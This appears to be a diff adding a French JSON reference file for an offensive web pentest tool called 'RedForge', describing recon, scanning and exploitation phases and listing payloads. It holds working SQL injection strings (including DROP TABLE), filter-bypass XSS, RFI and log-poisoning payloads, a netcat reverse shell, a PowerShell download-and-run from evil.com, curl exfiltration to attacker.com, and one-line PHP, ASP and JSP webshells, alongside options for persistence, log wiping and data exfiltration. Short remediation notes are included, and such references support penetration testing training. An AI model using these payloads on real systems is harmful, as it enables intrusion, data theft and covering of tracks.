@@ -1,0 +1,370 @@
+{
+    "footprint": {
+        "title": "Phase 1: Footprinting - Reconnaissance",
+        "description": "Cette phase collecte un maximum d'informations sur la cible sans être intrusif. Elle permet de cartographier la surface d'attaque et d'identifier les services exposés.",
+        "discoveries": [
+            "Adresses IP et sous-domaines",
+            "Services et ports ouverts",
+            "Technologies web utilisées (CMS, frameworks, langages)",
+            "Serveurs DNS et emails",
+            "Certificats SSL/TLS",
+            "Firewalls et systèmes de protection",
+            "Système d'exploitation distant"
+        ],
+        "options": {
+            "dns_enum": "Énumération DNS complète (enregistrements A, AAAA, MX, TXT, NS, SOA)",
+            "subdomains": "Découverte de sous-domaines par brute force",
+            "tech_detect": "Détection des technologies (serveur, langages, frameworks)",
+            "no_ping": "Ne pas pinguer la cible (évite la détection ICMP)",
+            "os_detect": "Détection du système d'exploitation",
+            "port_scan": "Scan des ports spécifiques (défaut: 1-1000)",
+            "service_version": "Détection des versions des services"
+        },
+        "examples": [
+            "RedForge -t example.com -p footprint",
+            "RedForge -t example.com -p footprint --dns-enum --subdomains",
+            "RedForge -t 192.168.1.0/24 -p footprint --port-scan",
+            "RedForge -f cibles.txt -p footprint --tech-detect --os-detect"
+        ],
+        "outputs": [
+            "~/.RedForge/workspace/footprint_[cible].json",
+            "~/.RedForge/workspace/nmap_[cible].xml",
+            "~/.RedForge/workspace/subdomains_[cible].txt",
+            "~/.RedForge/workspace/dns_[cible].json",
+            "~/.RedForge/workspace/technologies_[cible].json"
+        ],
+        "tools_used": [
+            "Nmap - Scan de ports et services",
+            "WhatWeb - Détection de technologies",
+            "DNSEnum - Énumération DNS",
+            "Sublist3r - Découverte de sous-domaines"
+        ]
+    },
+    
+    "analysis": {
+        "title": "Phase 2: Analysis - Analyse Approfondie",
+        "description": "Analyse détaillée de l'application web et de son fonctionnement. Identification des points d'entrée et de la logique métier.",
+        "analyses": [
+            "Structure des répertoires et fichiers cachés",
+            "Paramètres GET/POST et formulaires",
+            "Points d'entrée utilisateur",
+            "Système d'authentification et sessions",
+            "API endpoints (REST, GraphQL, SOAP)",
+            "Fichiers JavaScript et leurs endpoints",
+            "Workflows et logique métier",
+            "Points de terminaison sensibles (admin, backup, etc.)"
+        ],
+        "options": {
+            "dir_bruteforce": "Force brute des répertoires avec wordlist personnalisée",
+            "param_finder": "Découverte de paramètres cachés via fuzzing",
+            "api_detect": "Détection d'APIs REST/GraphQL/SOAP",
+            "js_analyze": "Analyse des fichiers JavaScript pour endpoints cachés",
+            "wordlist": "Fichier wordlist personnalisé pour la force brute",
+            "recursive": "Scan récursif des répertoires trouvés",
+            "extensions": "Extensions de fichiers à tester"
+        },
+        "examples": [
+            "RedForge -t example.com -p analysis",
+            "RedForge -t example.com -p analysis --dir-bruteforce --recursive",
+            "RedForge -t example.com -p analysis --api-detect --js-analyze",
+            "RedForge -t example.com -p analysis --param-finder --wordlist custom.txt"
+        ],
+        "outputs": [
+            "~/.RedForge/workspace/directories_[cible].txt",
+            "~/.RedForge/workspace/parameters_[cible].json",
+            "~/.RedForge/workspace/api_endpoints_[cible].json",
+            "~/.RedForge/workspace/js_endpoints_[cible].json"
+        ],
+        "tools_used": [
+            "Dirb/Gobuster - Force brute de répertoires",
+            "Arjun - Découverte de paramètres",
+            "JSBeautifier - Analyse JavaScript",
+            "Burp Suite - Analyse des endpoints"
+        ]
+    },
+    
+    "scan": {
+        "title": "Phase 3: Scanning - Scan de Vulnérabilités",
+        "description": "Détection automatisée des vulnérabilités web en utilisant les meilleurs outils spécialisés.",
+        "vulnerabilities": [
+            "Injections SQL (SQLi) - Tous types (error, union, boolean, time, blind)",
+            "Cross-Site Scripting (XSS) - Réfléchi, stocké, DOM",
+            "LFI/RFI (Local/Remote File Inclusion)",
+            "Command Injection",
+            "CSRF (Cross-Site Request Forgery)",
+            "SSRF (Server-Side Request Forgery)",
+            "XXE (XML External Entity)",
+            "Open Redirect",
+            "Path Traversal",
+            "Insecure Direct Object Reference (IDOR)",
+            "Mauvaises configurations de sécurité",
+            "Headers de sécurité manquants"
+        ],
+        "options": {
+            "sqlmap": "Scan SQLi avancé avec sqlmap (toutes techniques)",
+            "xss": "Scan XSS complet (XSStrike + Dalfox)",
+            "lfi": "Scan LFI/RFI avec payloads avancés",
+            "ssrf": "Scan SSRF avec callback collaborator",
+            "xxe": "Scan XXE avec détection d'entités externes",
+            "csrf": "Scan CSRF avec génération de PoC",
+            "idor": "Test d'IDOR sur paramètres numériques",
+            "level": "Niveau de scan (1-5, plus élevé = plus de payloads)",
+            "no_js": "Ignorer le JavaScript (plus rapide)",
+            "timeout": "Timeout par requête (secondes)",
+            "threads": "Nombre de threads (1-20)",
+            "blind": "Mode blind XSS avec callback"
+        },
+        "examples": [
+            "RedForge -t example.com -p scan",
+            "RedForge -t example.com -p scan --sqlmap --xss --level 3",
+            "RedForge -t example.com -p scan --lfi --ssrf --xxe",
+            "RedForge -t example.com -p scan --sqlmap --techniques=BEUST",
+            "RedForge -t example.com -p scan --xss --blind --callback=xss.report"
+        ],
+        "outputs": [
+            "~/.RedForge/workspace/vulnerabilities_[cible].json",
+            "~/.RedForge/workspace/sqli_[cible].log",
+            "~/.RedForge/workspace/xss_[cible].log",
+            "~/.RedForge/workspace/lfi_[cible].log"
+        ],
+        "tools_used": [
+            "SQLMap - Injection SQL",
+            "XSStrike/Dalfox - Cross-Site Scripting",
+            "LFISuite - LFI/RFI",
+            "SSRFmap - SSRF",
+            "XXEinjector - XXE"
+        ]
+    },
+    
+    "exploit": {
+        "title": "Phase 4: Exploitation",
+        "description": "Exploitation des vulnérabilités découvertes pour obtenir un accès ou des données sensibles.",
+        "capabilities": [
+            "Obtention de shell reverse (bind/reverse shell)",
+            "Upload de webshells (PHP, ASP, JSP, Python)",
+            "Élévation de privilèges (Linux/Windows)",
+            "Pillage de données (bases de données, fichiers, credentials)",
+            "Persistance sur la cible (cron, services, startup)",
+            "Pivotement vers d'autres systèmes",
+            "Exfiltration de données discrète",
+            "Effacement des traces (logs, historique)"
+        ],
+        "options": {
+            "reverse_shell": "Obtention d'un shell reverse automatique",
+            "bind_shell": "Bind shell sur la cible",
+            "payload": "Payload personnalisé (base64 encodé)",
+            "lhost": "IP du listener (défaut: interface active)",
+            "lport": "Port du listener (défaut: 4444)",
+            "persistence": "Établir une persistance sur la cible",
+            "cleanup": "Nettoyer les traces après exploitation",
+            "exfil": "Exfiltrer les données vers endpoint distant",
+            "timeout": "Timeout pour l'attente du shell (secondes)"
+        },
+        "payload_types": {
+            "bash": "Bash reverse shell (Linux)",
+            "nc": "Netcat reverse shell (Linux/Windows)",
+            "python": "Python reverse shell (cross-platform)",
+            "perl": "Perl reverse shell (Linux)",
+            "ruby": "Ruby reverse shell (Linux)",
+            "php": "PHP reverse shell (web)",
+            "powershell": "PowerShell reverse shell (Windows)",
+            "msfvenom": "Payload Metasploit personnalisé"
+        },
+        "examples": [
+            "RedForge -t example.com -p exploit",
+            "RedForge -t example.com -p exploit --reverse-shell --lport 5555",
+            "RedForge -t example.com -p exploit --persistence --cleanup",
+            "RedForge -t example.com -p exploit --payload=bash --lhost=10.0.0.1",
+            "RedForge -t example.com -p exploit --exfil --exfil-endpoint=https://collector.com"
+        ],
+        "outputs": [
+            "~/.RedForge/workspace/shell_[cible].log",
+            "~/.RedForge/workspace/loot_[cible].json",
+            "~/.RedForge/sessions/session_[timestamp].json"
+        ],
+        "tools_used": [
+            "Metasploit Framework",
+            "Netcat",
+            "Custom reverse shell scripts",
+            "PowerShell Empire"
+        ]
+    },
+    
+    "xss": {
+        "title": "Cross-Site Scripting (XSS)",
+        "description": "Le XSS permet d'injecter des scripts malveillants dans les pages web visualisées par d'autres utilisateurs. Il peut permettre le vol de cookies, la capture de frappe, le défaussement de site, etc.",
+        "types": {
+            "reflected": "Le payload est réfléchi immédiatement dans la réponse (non persistant)",
+            "stored": "Le payload est stocké sur le serveur et exécuté à chaque visite",
+            "dom": "Le payload modifie le DOM côté client sans passer par le serveur",
+            "blind": "Le payload s'exécute dans un contexte différent (admin panel, etc.)"
+        },
+        "payloads": [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "'\"><script>alert('XSS')</script>",
+            "<svg onload=alert('XSS')>",
+            "<body onload=alert('XSS')>",
+            "<input onfocus=alert('XSS') autofocus>",
+            "<iframe src='javascript:alert(\"XSS\")'>"
+        ],
+        "bypasses": [
+            "<ScRiPt>alert('XSS')</ScRiPt> (case manipulation)",
+            "%3Cscript%3Ealert('XSS')%3C/script%3E (URL encoding)",
+            "&#60;script&#62;alert('XSS')&#60;/script&#62; (HTML entities)",
+            "<svg/onload=alert`XSS`> (backticks)",
+            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;> (decimal encoding)",
+            "<img src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))> (base64)"
+        ],
+        "contexts": {
+            "html": "Entre balises HTML",
+            "attribute": "Dans un attribut HTML",
+            "javascript": "Dans du code JavaScript",
+            "url": "Dans une URL",
+            "css": "Dans du CSS"
+        },
+        "remediation": "Échapper les sorties HTML, utiliser CSP (Content Security Policy), valider les entrées, utiliser HttpOnly sur les cookies.",
+        "tools": [
+            "XSStrike - Scan XSS intelligent",
+            "Dalfox - Scan XSS rapide",
+            "Burp Suite - Scanner XSS intégré",
+            "XSS Hunter - Blind XSS detection"
+        ]
+    },
+    
+    "sql": {
+        "title": "Injection SQL (SQLi)",
+        "description": "L'injection SQL permet d'exécuter des requêtes SQL malveillantes dans la base de données de l'application. Peut permettre de lire, modifier ou supprimer des données sensibles.",
+        "types": {
+            "error": "Exploitation via messages d'erreur SQL",
+            "union": "Utilisation de UNION SELECT pour extraire des données",
+            "boolean": "Différences de réponse (True/False)",
+            "time": "Délais de réponse (SLEEP, BENCHMARK)",
+            "out_of_band": "Exfiltration de données via DNS/HTTP",
+            "stacked": "Requêtes multiples (; DROP TABLE)"
+        },
+        "payloads": [
+            "' OR '1'='1",
+            "1' UNION SELECT NULL--",
+            "1' AND SLEEP(5)--",
+            "1' AND 1=1--",
+            "1' AND 1=2--",
+            "1' ORDER BY 1--",
+            "1' UNION SELECT database(),user(),version()--",
+            "1'; DROP TABLE users--"
+        ],
+        "database_specific": {
+            "mysql": ["SLEEP(5)", "BENCHMARK(1000000,MD5('test'))", "version()", "database()"],
+            "postgresql": ["pg_sleep(5)", "version()", "current_database()", "current_user"],
+            "mssql": ["WAITFOR DELAY '0:0:5'", "@@VERSION", "DB_NAME()", "SYSTEM_USER"],
+            "oracle": ["dbms_pipe.receive_message('x',5)", "SELECT version FROM v$instance", "SELECT user FROM dual"]
+        },
+        "remediation": "Requêtes paramétrées, échappement des entrées, ORM, moindre privilège.",
+        "tools": [
+            "SQLMap - Injection SQL automatisée",
+            "jSQL Injection - Interface graphique",
+            "Havij - Injection SQL Windows"
+        ]
+    },
+    
+    "lfi": {
+        "title": "LFI/RFI - Inclusion de Fichiers",
+        "description": "Inclusion de fichiers locaux (LFI) ou distants (RFI). Peut permettre la lecture de fichiers sensibles, l'exécution de code ou la prise de contrôle du serveur.",
+        "types": {
+            "lfi": "Inclusion de fichiers locaux (lecture de /etc/passwd, etc.)",
+            "rfi": "Inclusion de fichiers distants (exécution de code à distance)",
+            "null_byte": "Contournement via null byte (%00) pour les versions PHP < 5.3",
+            "wrapper": "Utilisation de wrappers PHP (php://filter, expect://)"
+        },
+        "lfi_payloads": [
+            "../../../etc/passwd",
+            "....//....//etc/passwd",
+            "..;/..;/etc/passwd",
+            "..%2f..%2f..%2fetc%2fpasswd",
+            "..%c0%af..%c0%afetc%c0%afpasswd",
+            "php://filter/convert.base64-encode/resource=index.php",
+            "php://filter/read=convert.base64-encode/resource=config.php"
+        ],
+        "rfi_payloads": [
+            "http://evil.com/shell.txt",
+            "//evil.com/shell.php",
+            "ftp://evil.com/shell.php",
+            "http://evil.com/shell.php?cmd=id"
+        ],
+        "log_poisoning": [
+            "Injecter dans les logs Apache/Nginx",
+            "Injection via User-Agent: <?php system($_GET['cmd']); ?>",
+            "Inclusion du fichier de log: ../../../var/log/apache2/access.log"
+        ],
+        "remediation": "Valider les chemins, listes blanches, désactiver allow_url_include, configurer open_basedir.",
+        "tools": [
+            "LFISuite - Scan LFI/RFI",
+            "Kadimus - Exploitation LFI/RFI",
+            "Fimap - Scan LFI"
+        ]
+    },
+    
+    "command": {
+        "title": "Injection de Commandes",
+        "description": "Exécution de commandes système arbitraires sur le serveur. Peut mener à une prise de contrôle complète.",
+        "separators": [
+            [";", "Exécute la commande suivante (Unix/Windows)"],
+            ["|", "Pipe la sortie d'une commande vers une autre"],
+            ["||", "OU logique (exécute si la première échoue)"],
+            ["&", "Exécute en arrière-plan (Unix)"],
+            ["&&", "ET logique (exécute si la première réussit)"],
+            ["$()", "Substitution de commande (Unix)"],
+            ["``", "Substitution de commande (Unix)"],
+            ["%0a", "Nouvelle ligne encodée"],
+            ["%0d", "Retour chariot encodé"]
+        ],
+        "payloads": [
+            "; ls",
+            "| cat /etc/passwd",
+            "& whoami",
+            "$(id)",
+            "`uname -a`",
+            "; nc -e /bin/sh 10.0.0.1 4444",
+            "| powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')"
+        ],
+        "blind_payloads": [
+            "; ping -c 5 10.0.0.1",
+            "| nslookup test.attacker.com",
+            "& curl http://attacker.com/$(whoami)",
+            "$(sleep 5)"
+        ],
+        "remediation": "Éviter les appels système, utiliser des API sécurisées, valider et échapper les entrées, utiliser des listes blanches.",
+        "tools": [
+            "Commix - Injection de commandes",
+            "RCE Injector - Scanner RCE"
+        ]
+    },
+    
+    "upload": {
+        "title": "Upload de Fichiers",
+        "description": "Téléversement de fichiers malveillants sur le serveur. Peut mener à une exécution de code, un defacement ou une prise de contrôle.",
+        "bypasses": [
+            ["Double extension", "shell.php.jpg"],
+            ["Null byte", "shell.php%00.jpg"],
+            ["MIME type spoofing", "Content-Type: image/jpeg"],
+            ["Magic bytes", "GIF89a<?php ... ?>"],
+            ["Case sensitivity", "shell.PHP (sur Windows)"],
+            ["Extension alternative", "shell.phtml, shell.php5, shell.asp, shell.aspx"],
+            ["Content-Disposition", "filename=\"shell.php\""],
+            ["Content-Encoding", "multipart/form-data boundary manipulation"]
+        ],
+        "webshells": [
+            "PHP: <?php system($_GET['cmd']); ?>",
+            "ASP: <% eval request('cmd') %>",
+            "JSP: <%@ page import=\"java.io.*\" %><% Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+            "Python: exec(\"import subprocess; subprocess.call('id', shell=True)\")"
+        ],
+        "remediation": "Valider MIME, extensions, renommer les fichiers, stocker hors webroot, scanner antivirus, limiter la taille.",
+        "tools": [
+            "Burp Suite - Upload bypass",
+            "WeBaCoo - Web Backdoor Cookie",
+            "weevely - Webshell generator"
+        ]
+    }
+}
